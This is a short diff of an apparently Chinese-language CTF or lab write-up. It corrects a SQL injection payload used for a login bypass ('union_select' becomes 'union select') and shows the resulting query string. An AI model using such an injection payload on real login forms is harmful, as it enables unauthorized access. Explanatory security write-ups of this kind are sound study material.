@@ -473,7 +473,7 @@ foreach($loginStr as $n => $v){
 
 直接扔payload吧
 ```
-?loginstr[admin]=%27&password=+union_select+1,1+--
+?loginstr[admin]=%27&password=+union+select+1,1+--
 ````
 
 本地测试代码添加的片段：
@@ -484,4 +484,4 @@ var_dump($username, $v);
 ```
 
 在payload下sql语句变成
-`string(78) "select * from admin where username = '\' and password = ' union_select 1,1 --'" `
+`string(78) "select * from admin where username = '\' and password = ' union select 1,1 --'" `
